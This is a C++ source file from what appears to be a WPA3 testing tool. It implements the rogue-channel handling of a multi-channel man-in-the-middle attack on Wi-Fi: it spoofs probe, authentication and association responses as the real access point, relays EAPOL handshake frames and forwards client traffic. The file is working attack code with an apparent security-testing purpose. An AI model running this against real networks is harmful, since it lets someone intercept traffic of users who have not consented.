#include <reproc++/drain.hpp>
#include "attacks/mc_mitm/mc_mitm.h"
#include <tins/tins.h>
#include "attacks/mc_mitm/wifi_util.h"
#include "net_parser/dot11_defs.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"
namespace wpa3_tester {
using namespace std;
using namespace chrono;
using namespace Tins;
void McMitm::send_to_rogue(PDU &pdu) const { sock_rogue->send(pdu, netconfig.rogue_channel); }
void McMitm::send_to_rogue(const frame_raw_t &raw) const { sock_rogue->send(raw, netconfig.rogue_channel); }
FrameProcess McMitm::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>()) {
		const bool directed = dot11.addr1() == HWAddress<6>(ap.get(SK::mac));
		const bool wildcard = dot11.addr1() == HWAddress<6>::broadcast;
		if(!directed && !wildcard) return STOP;
		if(addr2 == client_state.get_mac() && client_state.get_state() == ClientState::Sent_to_rogue)
			client_state.update_state(ClientState::Finding);
		probe_resp->addr1(addr2);
		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
		resp->addr1(addr2);
		if(hooks) hooks->on_probe_response(*resp->find_pdu<Dot11ProbeResponse>());
		send_to_rogue(*resp);
		display_traffic(*pdu, "Rogue channel", " -- Replied");
		return STOP;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()) return STOP;
	return CONTINUE;
}
FrameProcess McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
		if(auth->auth_algorithm() == dot11::AUTH_ALG_OPEN && auth->auth_seq_number() == dot11::AUTH_SEQ_REQ) {
			// Open System Auth seq=1 ->  seq=2 success
			Dot11Authentication resp(addr2, ap.get(SK::mac)); // client <- rogue AP
			resp.addr3(ap.get(SK::mac));
			resp.auth_seq_number(dot11::AUTH_SEQ_RESP);
			resp.auth_algorithm(dot11::AUTH_ALG_OPEN);
			resp.status_code(dot11::STATUS_SUCCESS);
			send_to_rogue(resp);
			display_traffic(dot11, "Rogue channel", " -- Replied");
			client_state.update_state(ClientState::Authenticated);
			return STOP;
		}
	}
	return CONTINUE;
}
void McMitm::send_synth_assoc_resp(const HWAddress<6> &sta_mac) const {
	Dot11AssocResponse resp(sta_mac, HWAddress<6>(rogue_ap.get(SK::mac)));
	resp.addr3(HWAddress<6>(rogue_ap.get(SK::mac)));
	resp.capabilities() = beacon->capabilities();
	resp.status_code(0);
	resp.aid(1);
	for(const auto &opt : beacon->options()) {
		if(opt.option() == Dot11::SSID ||
		   opt.option() == Dot11ManagementFrame::TIM ||
		   opt.option() == Dot11ManagementFrame::DS_SET) continue;
		if(opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
			vector ht(opt.data_ptr(), opt.data_ptr() + opt.data_size());
			ht[0] = netconfig.rogue_channel.ch_num;
			resp.add_option({Dot11::HT_OPERATION, ht.size(), ht.data()});
			continue;
		}
		resp.add_option(opt);
	}
	patch_apsd(resp); // rogue AP must not advertise power-save support
	send_to_rogue(resp);
}
FrameProcess McMitm::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11, const frame_raw_t &raw) {
	if(hooks && hooks->on_assoc_request(*this, dot11, addr2)) return STOP;
	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>()) return CONTINUE;
	send_synth_assoc_resp(addr2);
	auto relayed = ensure_radiotap(raw);
	strip_power_mgmt_caps(relayed);
	send_to_real(relayed);
	client_state.update_state(ClientState::Associated);
	display_traffic(dot11, "Rogue channel", " -- Replied");
	return STOP;
}
void McMitm::handle_disconnect_rogue(const Dot11 &dot11) {
	if(!dot11.find_pdu<Dot11Deauthentication>() && !dot11.find_pdu<Dot11Disassoc>()) return;
	if(const auto *deauth = dot11.find_pdu<Dot11Deauthentication>())
		log(LogLevel::INFO, "Rogue channel: client Deauth reason={}", deauth->reason_code());
	if(client_state.get_state() < ClientState::GotMitm) {
		client_state.update_state(ClientState::Target_disconnected);
	} else if(dot11.find_pdu<Dot11Disassoc>()) {
		client_state.update_state(ClientState::Authenticated);
	} else {
		client_state.update_state(ClientState::Sent_to_rogue);
	}
}
FrameProcess McMitm::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu, const frame_raw_t &raw) {
	// EAPOL STA -> AP
	if(addr1 == ap.get(SK::mac) && addr2 == client_state.get_mac() && is_eapol(pdu)) {
		const auto eapol_msg = get_eapol_msg_num(raw);
		if(eapol_msg == EapolMsg::Msg2 || eapol_msg == EapolMsg::Msg4) {
			log(LogLevel::INFO, "Rogue channel: EAPOL {}/4 from STA -> AP real channel", static_cast<int>(eapol_msg));
			send_to_real(pdu);
		}
		if(eapol_msg == EapolMsg::Msg4 && client_state.get_state() >= ClientState::Sent_to_rogue) {
			client_state.update_state(ClientState::GotMitm);
			if(hooks) hooks->on_client_connected(*this);
			if(only_to_mitm) stop_mitm = true;
		}
		return STOP;
	}
	return CONTINUE;
}
void McMitm::power_mgmt_response_rogue(HWAddress<6> addr2, const Dot11 &dot11) const {
	if(dot11.addr1() != rogue_ap.get(SK::mac)) return;
	if(client_state.get_mac() != addr2) return;
	const bool is_null = dot11.type() == Dot11::DATA
		&& (dot11.subtype() == Dot11::DATA_NULL || dot11.subtype() == Dot11::QOS_DATA_NULL);
	const bool is_ps_poll = dot11.type() == Dot11::CONTROL && dot11.subtype() == Dot11::DOT11_PS_POLL;
	if(!dot11.power_mgmt() || !(is_null || is_ps_poll)) return;
	log(LogLevel::WARNING, "Rogue channel: client {} going to sleep - waking with Null Data", addr2);
	Dot11Data null_frame(addr2, HWAddress<6>(rogue_ap.get(SK::mac)));
	null_frame.addr3(HWAddress<6>(rogue_ap.get(SK::mac)));
	null_frame.from_ds(1);
	null_frame.to_ds(0);
	null_frame.subtype(Dot11::DATA_NULL);
	null_frame.more_data(1);
	send_to_rogue(null_frame);
}
void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;
	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.rogue_channel)) {
			return;
		}
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL) {
		log(LogLevel::DEBUG, "Rogue_cannel: Unknown frame type");
		return;
	}
	if(dot11->find_pdu<Dot11Beacon>()) return;
	power_mgmt_response_rogue(addr2, *dot11);
#define SOLVE_OR_CONTINUE(handle_fun)                                                                                  \
	if(handle_fun) return;
	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
	SOLVE_OR_CONTINUE(handle_open_auth(addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr1, addr2, *pdu, raw))
#undef SOLVE_OR_CONTINUE
	if(addr2 == ap.get(SK::mac)) { // AP ->
		if(client_state.get_mac() == dot11->addr1() || client_state.get_state() > ClientState::Target_disconnected) {
			display_traffic(*pdu, "Rogue channel");
		}
	} else if(dot11->addr1() == ap.get(SK::mac)) { // -> AP
		if(client_state.get_mac() == addr2) {
			handle_disconnect_rogue(*dot11);
			send_to_real(raw);
			display_traffic(*pdu, "Rogue channel", " -- MitM'ing");
			if(dot11->type() == Dot11::DATA && client_state.get_state() < ClientState::GotMitm) {
				client_state.update_state(ClientState::GotMitm);
				if(hooks) hooks->on_client_connected(*this);
				if(only_to_mitm) stop_mitm = true;
			}
		}
	} else if(client_state.get_mac() == dot11->addr1() || client_state.get_mac() == addr2) {
		display_traffic(*pdu, "Rogue channel", "_");
	}
}
}